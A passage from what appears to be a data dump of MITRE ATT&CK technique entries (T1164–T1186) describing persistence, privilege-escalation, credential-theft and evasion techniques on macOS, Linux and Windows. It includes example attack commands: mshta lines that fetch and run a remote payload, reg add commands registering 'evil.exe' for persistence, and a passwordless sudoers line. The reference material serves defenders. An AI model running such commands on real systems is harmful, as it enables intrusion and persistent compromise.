                          'Adversaries can use the rc.common file as a way to hide code for persistence that will '
                          'execute on each reboot as the root user (Citation: Methods of Mac Malware Persistence).',
           'name': 'Rc.common',
           'platforms': ['macOS']},
 'T1164': {'attack_id': 'T1164',
           'categories': ['persistence'],
           'description': 'Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened '
                          'when a user reboots their machine. While this is usually done via a Graphical User '
                          'Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain '
                          'this information as well located at '
                          '<code>~/Library/Preferences/com.apple.loginwindow.plist</code> and '
                          '<code>~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist</code>. \n'
                          '\n'
                          'An adversary can modify one of these files directly to include a link to their malicious '
                          'executable to provide a persistence mechanism each time the user reboots their machine '
                          '(Citation: Methods of Mac Malware Persistence).',
           'name': 'Re-opened Applications',
           'platforms': ['macOS']},
 'T1165': {'attack_id': 'T1165',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Per Apple’s documentation, startup items execute during the final phase of the boot process '
                          'and contain shell scripts or other executable files along with configuration information '
                          'used by the system to determine the execution order for all startup items (Citation: '
                          'Startup Items). This is technically a deprecated version (superseded by Launch Daemons), '
                          'and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to '
                          'exist on the system by default, but does appear to exist by default on macOS Sierra. A '
                          'startup item is a directory whose executable and configuration property list (plist), '
                          '<code>StartupParameters.plist</code>, reside in the top-level directory. \n'
                          '\n'
                          'An adversary can create the appropriate folders/files in the StartupItems directory to '
                          'register their own persistence mechanism (Citation: Methods of Mac Malware Persistence). '
                          'Additionally, since StartupItems run during the bootup phase of macOS, they will run as '
                          'root. If an adversary is able to modify an existing Startup Item, then they will be able to '
                          'Privilege Escalate as well.',
           'name': 'Startup Items',
           'platforms': ['macOS']},
 'T1166': {'attack_id': 'T1166',
           'categories': ['privilege-escalation', 'persistence'],
           'description': 'When the setuid or setgid bits are set on Linux or macOS for an application, this means '
                          'that the application will run with the privileges of the owning user or group respectively  '
                          '(Citation: setuid man page). Normally an application is run in the current user’s context, '
                          'regardless of which user or group owns the application. There are instances where programs '
                          'need to be executed in an elevated context to function properly, but the user running them '
                          'doesn’t need the elevated privileges. Instead of creating an entry in the sudoers file, '
                          'which must be done by root, any user can specify the setuid or setgid flag to be set for '
                          'their own applications. These bits are indicated with an "s" instead of an "x" when viewing '
                          "a file's attributes via <code>ls -l</code>. The <code>chmod</code> program can set these "
                          'bits with via bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, '
                          '<code>chmod u+s [file]</code>.\n'
                          '\n'
                          'An adversary can take advantage of this to either do a shell escape or exploit a '
                          'vulnerability in an application with the setsuid or setgid bits to get code running in a '
                          'different user’s context. Additionally, adversaries can use this mechanism on their own '
                          "malware to make sure they're able to execute in elevated contexts in the future  (Citation: "
                          'OSX Keydnap malware).',
           'name': 'Setuid and Setgid',
           'platforms': ['Linux', 'macOS']},
 'T1167': {'attack_id': 'T1167',
           'categories': ['credential-access'],
           'description': 'In OS X prior to El Capitan, users with root access can read plaintext keychain passwords '
                          'of logged-in users because Apple’s keychain implementation allows these credentials to be '
                          'cached so that users are not repeatedly prompted for passwords. (Citation: OS X Keychain) '
                          '(Citation: External to DA, the OS X Way) Apple’s securityd utility takes the user’s logon '
                          'password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a '
                          'set of keys and algorithms to encrypt the user’s password, but once the master key is '
                          'found, an attacker need only iterate over the other values to unlock the final password. '
                          '(Citation: OS X Keychain)\n'
                          '\n'
                          'If an adversary can obtain root access (allowing them to read securityd’s memory), then '
                          'they can scan through memory to find the correct sequence of keys in relatively few tries '
                          'to decrypt the user’s logon keychain. This provides the adversary with all the plaintext '
                          'passwords for users, WiFi, mail, browsers, certificates, secure notes, etc. (Citation: OS X '
                          'Keychain) (Citation: OSX Keydnap malware)',
           'name': 'Securityd Memory',
           'platforms': ['macOS']},
 'T1168': {'attack_id': 'T1168',
           'categories': ['persistence', 'execution'],
           'description': 'On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and '
                          'periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: '
                          'Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike '
                          '[Scheduled Task](https://attack.mitre.org/techniques/T1053) on Windows systems, job '
                          'scheduling on Linux-based systems cannot be done remotely unless used in conjunction within '
                          'an established remote session, like secure shell (SSH).\n'
                          '\n'
                          '### cron\n'
                          '\n'
                          'System-wide cron jobs are installed by modifying <code>/etc/crontab</code> file, '
                          '<code>/etc/cron.d/</code> directory or other locations supported by the Cron daemon, while '
                          'per-user cron jobs are installed using crontab with specifically formatted crontab files. '
                          '(Citation: AppleDocs Scheduling Timed Jobs) This works on macOS and Linux systems.\n'
                          '\n'
                          'Those methods allow for commands or scripts to be executed at specific, periodic intervals '
                          'in the background without user interaction. An adversary may use job scheduling to execute '
                          'programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) '
                          '(Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) '
                          '(Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral '
                          'Movement, to gain root privileges, or to run a process under the context of a specific '
                          'account.\n'
                          '\n'
                          '### at\n'
                          '\n'
                          'The at program is another means on POSIX-based systems, including macOS and Linux, to '
                          'schedule a program or script job for execution at a later date and/or time, which could '
                          'also be used for the same purposes.\n'
                          '\n'
                          '### launchd\n'
                          '\n'
                          'Each launchd job is described by a different configuration property list (plist) file '
                          'similar to [Launch Daemon](https://attack.mitre.org/techniques/T1160) or [Launch '
                          'Agent](https://attack.mitre.org/techniques/T1159), except there is an additional key called '
                          '<code>StartCalendarInterval</code> with a dictionary of time values. (Citation: AppleDocs '
                          'Scheduling Timed Jobs) This only works on macOS and OS X.',
           'name': 'Local Job Scheduling',
           'platforms': ['Linux', 'macOS']},
 'T1169': {'attack_id': 'T1169',
           'categories': ['privilege-escalation'],
           'description': 'The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands '
                          'and from which terminals. This also describes which commands users can run as other users '
                          'or groups. This provides the idea of least privilege such that users are running in their '
                          'lowest possible permissions for most of the time and only elevate to other users or '
                          'permissions as needed, typically by prompting for a password. However, the sudoers file can '
                          'also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) '
                          'NOPASSWD: ALL</code> (Citation: OSX.Dok Malware). \n'
                          '\n'
                          'Adversaries can take advantage of these configurations to execute commands as other users '
                          'or spawn processes with higher privileges. You must have elevated privileges to edit this '
                          'file though.',
           'name': 'Sudo',
           'platforms': ['Linux', 'macOS']},
 'T1170': {'attack_id': 'T1170',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the '
                          'file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are '
                          'standalone applications that execute using the same models and technologies of Internet '
                          'Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n'
                          '\n'
                          'Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or '
                          'VBScript through a trusted Windows utility. There are several examples of different types '
                          'of threats leveraging mshta.exe during initial compromise and for execution of code '
                          '(Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: '
                          'FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: '
                          'FireEye FIN7 April 2017) \n'
                          '\n'
                          'Files may be executed by mshta.exe through an inline script: <code>mshta '
                          'vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>\n'
                          '\n'
                          'They may also be executed directly from URLs: <code>mshta '
                          'http[:]//webserver/payload[.]hta</code>\n'
                          '\n'
                          'Mshta.exe can be used to bypass application whitelisting solutions that do not account for '
                          "its potential use. Since mshta.exe executes outside of the Internet Explorer's security "
                          'context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)',
           'name': 'Mshta',
           'platforms': ['Windows']},
 'T1171': {'attack_id': 'T1171',
           'categories': ['credential-access'],
           'description': 'Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are '
                          'Microsoft Windows components that serve as alternate methods of host identification. LLMNR '
                          'is based upon the Domain Name System (DNS) format and allows hosts on the same local link '
                          'to perform name resolution for other hosts. NBT-NS identifies systems on a local network by '
                          'their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n'
                          '\n'
                          'Adversaries can spoof an authoritative source for name resolution on a victim network by '
                          'responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the '
                          'requested host, effectively poisoning the service so that the victims will communicate with '
                          'the adversary controlled system. If the requested host belongs to a resource that requires '
                          'identification/authentication, the username and NTLMv2 hash will then be sent to the '
                          'adversary controlled system. The adversary can then collect the hash information sent over '
                          'the wire through tools that monitor the ports for traffic or through [Network '
                          'Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through '
                          '[Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. '
                          'In some cases where an adversary has access to a system that is in the authentication path '
                          'between systems or when automated scans that use credentials attempt to authenticate to an '
                          'adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and '
                          'execute code against a target system. The relay step can happen in conjunction with '
                          'poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM '
                          'Relaying)(Citation: Secure Ideas SMB Relay)\n'
                          '\n'
                          'Several tools exist that can be used to poison name services within local networks such as '
                          'NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: '
                          'GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)',
           'name': 'LLMNR/NBT-NS Poisoning and Relay',
           'platforms': ['Windows']},
 'T1172': {'attack_id': 'T1172',
           'categories': ['command-and-control'],
           'description': 'Domain fronting takes advantage of routing schemes in Content Delivery Networks (CDNs) and '
                          'other services which host multiple domains to obfuscate the intended destination of HTTPS '
                          'traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent '
                          'Communication through domain fronting 2015) The technique involves using different domain '
                          'names in the SNI field of the TLS header and the Host field of the HTTP header. If both '
                          'domains are served from the same CDN, then the CDN may route to the address specified in '
                          'the HTTP header after unwrapping the TLS header. A variation of the the technique, '
                          '"domainless" fronting, utilizes a SNI field that is left blank; this may allow the fronting '
                          'to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if '
                          'the blank SNI fields are ignored).\n'
                          '\n'
                          'For example, if domain-x and domain-y are customers of the same CDN, it is possible to '
                          'place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be '
                          'going to domain-x, however the CDN may route it to domain-y.',
           'name': 'Domain Fronting',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1173': {'attack_id': 'T1173',
           'categories': ['execution'],
           'description': 'Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or '
                          'continuous inter-process communication (IPC) between applications. Once a link is '
                          'established, applications can autonomously exchange transactions consisting of strings, '
                          'warm data links (notifications when a data item changes), hot data links (duplications of '
                          'changes to a data item), and requests for command execution.\n'
                          '\n'
                          'Object Linking and Embedding (OLE), or the ability to link data between documents, was '
                          'originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in '
                          'Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer '
                          'DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: '
                          'Microsoft DDE Advisory Nov 2017)\n'
                          '\n'
                          'Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be '
                          'poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE '
                          'Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and '
                          'used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of '
                          'Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) '
                          'DDE could also be leveraged by an adversary operating on a compromised machine who does not '
                          'have direct access to command line execution.',
           'name': 'Dynamic Data Exchange',
           'platforms': ['Windows']},
 'T1174': {'attack_id': 'T1174',
           'categories': ['credential-access'],
           'description': 'Windows password filters are password policy enforcement mechanisms for both domain and '
                          'local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a '
                          'method to validate potential passwords against password policies. Filter DLLs can be '
                          'positioned on local computers for local accounts and/or domain controllers for domain '
                          'accounts.\n'
                          '\n'
                          'Before registering new passwords in the Security Accounts Manager (SAM), the Local Security '
                          'Authority (LSA) requests validation from each registered filter. Any potential changes '
                          'cannot take effect until every registered filter acknowledges validation.\n'
                          '\n'
                          'Adversaries can register malicious password filters to harvest credentials from local '
                          'computers and/or entire domains. To perform proper validation, filters must receive '
                          'plain-text credentials from the LSA. A malicious password filter would receive these '
                          'plain-text credentials every time a password request is made. (Citation: Carnal Ownage '
                          'Password Filters Sept 2013)',
           'name': 'Password Filter DLL',
           'platforms': ['Windows']},
 'T1175': {'attack_id': 'T1175',
           'categories': ['lateral-movement', 'execution'],
           'description': 'Adversaries may use the Windows Component Object Model (COM) and Distributed Component '
                          'Object Model (DCOM) for local code execution or to execute on remote systems as part of '
                          'lateral movement. \n'
                          '\n'
                          'COM is a component of the native Windows application programming interface (API) that '
                          'enables interaction between software objects, or executable code that implements one or '
                          'more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can '
                          'call methods of server objects, which are typically Dynamic Link Libraries (DLL) or '
                          'executables (EXE).(Citation: Microsoft COM) DCOM is transparent middleware that extends the '
                          'functionality of Component Object Model (COM) (Citation: Microsoft COM) beyond a local '
                          'computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June '
                          '2019)\n'
                          '\n'
                          'Permissions to interact with local and remote server COM objects are specified by access '
                          'control lists (ACL) in the Registry. (Citation: Microsoft COM ACL)(Citation: Microsoft '
                          'Process Wide Com Keys)(Citation: Microsoft System Wide Com Keys) By default, only '
                          'Administrators may remotely activate and launch COM objects through DCOM.\n'
                          '\n'
                          'Adversaries may abuse COM for local command and/or payload execution. Various COM '
                          'interfaces are exposed that can be abused to invoke arbitrary execution via a variety of '
                          'programming languages such as C, C++, Java, and VBScript.(Citation: Microsoft COM) Specific '
                          'COM objects also exists to directly perform functions beyond code execution, such as '
                          'creating a [Scheduled Task](https://attack.mitre.org/techniques/T1053), fileless '
                          'download/execution, and other adversary behaviors such as Privilege Escalation and '
                          'Persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP '
                          'Apr 2018)\n'
                          '\n'
                          'Adversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the '
                          'context of an appropriately privileged user can remotely obtain arbitrary and even direct '
                          'shellcode execution through Office applications (Citation: Enigma Outlook DCOM Lateral '
                          'Movement Nov 2017) as well as other Windows objects that contain insecure '
                          'methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan '
                          '2017) DCOM can also execute macros in existing documents (Citation: Enigma Excel DCOM Sept '
                          '2017) and may also invoke [Dynamic Data '
                          'Exchange](https://attack.mitre.org/techniques/T1173) (DDE) execution directly through a COM '
                          'created instance of a Microsoft Office application (Citation: Cyberreason DCOM DDE Lateral '
                          'Movement Nov 2017), bypassing the need for a malicious document.',
           'name': 'Component Object Model and Distributed COM',
           'platforms': ['Windows']},
 'T1176': {'attack_id': 'T1176',
           'categories': ['persistence'],
           'description': 'Browser extensions or plugins are small programs that can add functionality and customize '
                          "aspects of internet browsers. They can be installed directly or through a browser's app "
                          'store. Extensions generally have access and permissions to everything that the browser can '
                          'access. (Citation: Wikipedia Browser Extension) (Citation: Chrome Extensions Definition)\n'
                          '\n'
                          'Malicious extensions can be installed into a browser through malicious app store downloads '
                          'masquerading as legitimate extensions, through social engineering, or by an adversary that '
                          'has already compromised a system. Security can be limited on browser app stores so may not '
                          'be difficult for malicious extensions to defeat automated scanners and be uploaded. '
                          '(Citation: Malicious Chrome Extension Numbers) Once the extension is installed, it can '
                          'browse to websites in the background, (Citation: Chrome Extension Crypto Miner) (Citation: '
                          'ICEBRG Chrome Extensions) steal all information that a user enters into a browser, to '
                          'include credentials, (Citation: Banker Google Chrome Extension Steals Creds) (Citation: '
                          'Catch All Chrome Extension) and be used as an installer for a RAT for persistence. There '
                          'have been instances of botnets using a persistent backdoor through malicious Chrome '
                          'extensions. (Citation: Stantinko Botnet) There have also been similar examples of '
                          'extensions being used for command & control  (Citation: Chrome Extension C2 Malware).',
           'name': 'Browser Extensions',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1177': {'attack_id': 'T1177',
           'categories': ['execution', 'persistence'],
           'description': 'The Windows security subsystem is a set of components that manage and enforce the security '
                          'policy for a computer or domain. The Local Security Authority (LSA) is the main component '
                          'responsible for local security policy and user authentication. The LSA includes multiple '
                          'dynamic link libraries (DLLs) associated with various other security functions, all of '
                          'which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: '
                          'Microsoft Security Subsystem)\n'
                          '\n'
                          'Adversaries may target lsass.exe drivers to obtain execution and/or persistence. By either '
                          'replacing or adding illegitimate drivers (e.g., [DLL '
                          'Side-Loading](https://attack.mitre.org/techniques/T1073) or [DLL Search Order '
                          'Hijacking](https://attack.mitre.org/techniques/T1038)), an adversary can achieve arbitrary '
                          'code execution triggered by continuous LSA operations.',
           'name': 'LSASS Driver',
           'platforms': ['Windows']},
 'T1178': {'attack_id': 'T1178',
           'categories': ['privilege-escalation'],
           'description': 'The Windows security identifier (SID) is a unique value that identifies a user or group '
                          'account. SIDs are used by Windows security in both security descriptors and access tokens. '
                          '(Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active '
                          'Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable '
                          'account migration between domains (e.g., all values in SID-History are included in access '
                          'tokens).\n'
                          '\n'
                          'Adversaries may use this mechanism for privilege escalation. With Domain Administrator (or '
                          'equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs '
                          'Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary '
                          'users/groups such as Enterprise Administrators. This manipulation may result in elevated '
                          'access to local resources and/or access to otherwise inaccessible domains via lateral '
                          'movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), '
                          '[Windows Admin Shares](https://attack.mitre.org/techniques/T1077), or [Windows Remote '
                          'Management](https://attack.mitre.org/techniques/T1028).',
           'name': 'SID-History Injection',
           'platforms': ['Windows']},
 'T1179': {'attack_id': 'T1179',
           'categories': ['persistence', 'privilege-escalation', 'credential-access'],
           'description': 'Windows processes often leverage application programming interface (API) functions to '
                          'perform tasks that require reusable system resources. Windows API functions are typically '
                          'stored in dynamic-link libraries (DLLs) as exported functions. \n'
                          '\n'
                          'Hooking involves redirecting calls to these functions and can be implemented via:\n'
                          '\n'
                          '* **Hooks procedures**, which intercept and execute designated code in response to events '
                          'such as messages, keystrokes, and mouse inputs. (Citation: Microsoft Hook Overview) '
                          '(Citation: Endgame Process Injection July 2017)\n'
                          '* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where '
                          'pointers to imported API functions are stored. (Citation: Endgame Process Injection July '
                          '2017) (Citation: Adlice Software IAT Hooks Oct 2014) (Citation: MWRInfoSecurity Dynamic '
                          'Hooking 2015)\n'
                          '* **Inline hooking**, which overwrites the first bytes in an API function to redirect code '
                          'flow. (Citation: Endgame Process Injection July 2017) (Citation: HighTech Bridge Inline '
                          'Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n'
                          '\n'
                          'Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), adversaries may '
                          'use hooking to load and execute malicious code within the context of another process, '
                          "masking the execution while also allowing access to the process's memory and possibly "
                          'elevated privileges. Installing hooking mechanisms may also provide Persistence via '
                          'continuous invocation when the functions are called through normal use.\n'
                          '\n'
                          'Malicious hooking mechanisms may also capture API calls that include parameters that reveal '
                          'user authentication credentials for Credential Access. (Citation: Microsoft '
                          'TrojanSpy:Win32/Ursnif.gen!I Sept 2017)\n'
                          '\n'
                          'Hooking is commonly utilized by [Rootkit](https://attack.mitre.org/techniques/T1014)s to '
                          'conceal files, processes, Registry keys, and other objects in order to hide malware and '
                          'associated behaviors. (Citation: Symantec Windows Rootkits)',
           'name': 'Hooking',
           'platforms': ['Windows']},
 'T1180': {'attack_id': 'T1180',
           'categories': ['persistence'],
           'description': 'Screensavers are programs that execute after a configurable time of user inactivity and '
                          'consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia '
                          'Screensaver) The Windows screensaver application scrnsave.scr is located in '
                          '<code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code> on 64-bit '
                          'Windows systems, along with screensavers included with base Windows installations. \n'
                          '\n'
                          'The following screensaver settings are stored in the Registry (<code>HKCU\\Control '
                          'Panel\\Desktop\\</code>) and could be manipulated to achieve persistence:\n'
                          '\n'
                          '* <code>SCRNSAVE.exe</code> - set to malicious PE path\n'
                          "* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver\n"
                          "* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock\n"
                          '* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is '
                          'executed\n'
                          '\n'
                          'Adversaries can use screensaver settings to maintain persistence by setting the screensaver '
                          'to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug '
                          '2017)',
           'name': 'Screensaver',
           'platforms': ['Windows']},
 'T1181': {'attack_id': 'T1181',
           'categories': ['defense-evasion', 'privilege-escalation'],
           'description': 'Before creating a window, graphical Windows-based processes must prescribe to or register a '
                          'windows class, which stipulate appearance and behavior (via windows procedures, which are '
                          'functions that handle input/output of data). (Citation: Microsoft Window Classes) '
                          'Registration of new windows classes can include a request for up to 40 bytes of extra '
                          'window memory (EWM) to be appended to the allocated memory of each instance of that class. '
                          'This EWM is intended to store data specific to that window and has specific application '
                          'programming interface (API) functions to set and get its value. (Citation: Microsoft '
                          'GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n'
                          '\n'
                          'Although small, the EWM is large enough to store a 32-bit pointer and is often used to '
                          'point to a windows procedure. Malware may possibly utilize this memory location in part of '
                          'an attack chain that includes writing code to shared sections of the process’s memory, '
                          'placing a pointer to the code in EWM, then invoking execution by returning execution '
                          'control to the address in the process’s EWM.\n'
                          '\n'
                          'Execution granted through EWM injection may take place in the address space of a separate '
                          'live process. Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), '
                          "this may allow access to both the target process's memory and possibly elevated privileges. "
                          'Writing payloads to shared sections also avoids the use of highly monitored API calls such '
                          'as WriteProcessMemory and CreateRemoteThread. (Citation: Endgame Process Injection July '
                          '2017) More sophisticated malware samples may also potentially bypass protection mechanisms '
                          'such as data execution prevention (DEP) by triggering a combination of windows procedures '
                          'and other system functions that will rewrite the malicious payload inside an executable '
                          'portion of the target process. (Citation: MalwareTech Power Loader Aug 2013) (Citation: '
                          'WeLiveSecurity Gapz and Redyms Mar 2013)',
           'name': 'Extra Window Memory Injection',
           'platforms': ['Windows']},
 'T1182': {'attack_id': 'T1182',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under '
                          '<code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> are '
                          'loaded into every process that calls the ubiquitously used application programming '
                          'interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, '
                          'CreateProcessWithTokenW, or WinExec. (Citation: Endgame Process Injection July 2017)\n'
                          '\n'
                          'Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can '
                          'be abused to obtain persistence and privilege escalation by causing a malicious DLL to be '
                          'loaded and run in the context of separate processes on the computer.',
           'name': 'AppCert DLLs',
           'platforms': ['Windows']},
 'T1183': {'attack_id': 'T1183',
           'categories': ['privilege-escalation', 'persistence', 'defense-evasion'],
           'description': 'Image File Execution Options (IFEO) enable a developer to attach a debugger to an '
                          'application. When a process is created, a debugger present in an application’s IFEO will be '
                          'prepended to the application’s name, effectively launching the new process under the '
                          'debugger (e.g., “C:\\dbg\\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO '
                          'Mar 2010)\n'
                          '\n'
                          'IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. '
                          '(Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values '
                          'in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows '
                          'NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where '
                          '<code><executable></code> is the binary on which the debugger is attached. (Citation: '
                          'Microsoft Dev Blog IFEO Mar 2010)\n'
                          '\n'
                          'IFEOs can also enable an arbitrary monitor program to be launched when a specified program '
                          'silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode '
                          'process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR '
                          '2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by '
                          'directly modifying IEFO and silent process exit Registry values in '
                          '<code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows '
                          'NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit '
                          'NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)\n'
                          '\n'
                          'An example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar '
                          'Moe IFEO APR 2018)\n'
                          '\n'
                          '* <code>reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File '
                          'Execution Options\\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512</code>\n'
                          '* <code>reg add "HKLM\\SOFTWARE\\Microsoft\\Windows '
                          'NT\\CurrentVersion\\SilentProcessExit\\notepad.exe" /v ReportingMode /t REG_DWORD /d '
                          '1</code>\n'
                          '* <code>reg add "HKLM\\SOFTWARE\\Microsoft\\Windows '
                          'NT\\CurrentVersion\\SilentProcessExit\\notepad.exe" /v MonitorProcess /d '
                          '"C:\\temp\\evil.exe"</code>\n'
                          '\n'
                          'Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may '
                          'be abused to obtain persistence and privilege escalation by causing a malicious executable '
                          'to be loaded and run in the context of separate processes on the computer. (Citation: '
                          'Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide '
                          'Persistence via continuous invocation.\n'
                          '\n'
                          'Malware may also use IFEO for Defense Evasion by registering invalid debuggers that '
                          'redirect and effectively disable various system and security applications. (Citation: '
                          'FSecure Hupigon) (Citation: Symantec Ushedix June 2008)',
           'name': 'Image File Execution Options Injection',
           'platforms': ['Windows']},
 'T1184': {'attack_id': 'T1184',
           'categories': ['lateral-movement'],
           'description': 'Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It '
                          'allows a user to connect to another system via an encrypted tunnel, commonly authenticating '
                          'through a password, certificate or the use of an asymmetric encryption key pair.\n'
                          '\n'
                          'In order to move laterally from a compromised host, adversaries may take advantage of trust '
                          'relationships established with other systems via public key authentication in active SSH '
                          'sessions by hijacking an existing connection to another system. This may occur through '
                          "compromising the SSH agent itself or by having access to the agent's socket. If an "
                          'adversary is able to obtain root access, then hijacking SSH sessions is likely trivial. '
                          '(Citation: Slideshare Abusing SSH) (Citation: SSHjack Blackhat) (Citation: Clockwork SSH '
                          'Agent Hijacking) Compromising the SSH agent also provides access to intercept SSH '
                          'credentials. (Citation: Welivesecurity Ebury SSH)\n'
                          '\n'
                          '[SSH Hijacking](https://attack.mitre.org/techniques/T1184) differs from use of [Remote '
                          'Services](https://attack.mitre.org/techniques/T1021) because it injects into an existing '
                          'SSH session rather than creating a new session using [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078).',
           'name': 'SSH Hijacking',
           'platforms': ['Linux', 'macOS']},
 'T1185': {'attack_id': 'T1185',
           'categories': ['collection'],
           'description': 'Adversaries can take advantage of security vulnerabilities and inherent functionality in '
                          'browser software to change content, modify behavior, and intercept information as part of '
                          'various man in the browser techniques. (Citation: Wikipedia Man in the Browser)\n'
                          '\n'
                          'A specific example is when an adversary injects software into a browser that allows an them '
                          'to inherit cookies, HTTP sessions, and SSL client certificates of a user and use the '
                          'browser as a way to pivot into an authenticated intranet. (Citation: Cobalt Strike Browser '
                          'Pivot) (Citation: ICEBRG Chrome Extensions)\n'
                          '\n'
                          'Browser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. '
                          "Browser traffic is pivoted from the adversary's browser through the user's browser by "
                          'setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not '
                          "alter the user's traffic in any way. The proxy connection is severed as soon as the browser "
                          'is closed. Whichever browser process the proxy is injected into, the adversary assumes the '
                          'security context of that process. Browsers typically create a new process for each tab that '
                          'is opened and permissions and certificates are separated accordingly. With these '
                          'permissions, an adversary could browse to any resource on an intranet that is accessible '
                          'through the browser and which the browser has sufficient permissions, such as Sharepoint or '
                          'webmail. Browser pivoting also eliminates the security provided by 2-factor authentication. '
                          '(Citation: cobaltstrike manual)',
           'name': 'Man in the Browser',
           'platforms': ['Windows']},
 'T1186': {'attack_id': 'T1186',
           'categories': ['defense-evasion'],
           'description': 'Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file '
                          'operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one '
                          'transacted handle to write to a file at a given time. Until the write handle transaction is '
                          'terminated, all other handles are isolated from the writer and may only read the committed '
                          'version of the file that existed at the time the handle was opened. (Citation: Microsoft '
                          'Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system '
